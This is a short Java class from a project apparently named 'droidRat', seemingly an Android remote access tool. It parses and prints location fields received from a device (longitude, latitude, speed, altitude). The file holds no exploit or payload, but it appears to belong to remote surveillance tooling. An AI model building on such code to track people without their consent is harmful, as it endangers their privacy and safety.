package com.je_chen.droidRat.module.process.receive.data.process;

import com.je_chen.droidRat.module.process.receive.data.process_super.DataFather;

import java.util.Arrays;

public class LocationData extends DataFather {

    @Override
    public void processData(String[] dataArray) {
        System.out.println(Arrays.toString(dataArray));
        switch (dataArray[1]) {
            case "Longitude":
            case "Latitude":
            case "Speed":
            case "Altitude":
                System.out.println(dataArray[1] + " : " + dataArray[2]);
                break;
            case "LocationGeo":
                System.out.println(dataArray[0] + " : " + dataArray[1]);
                break;
        }
    }

}
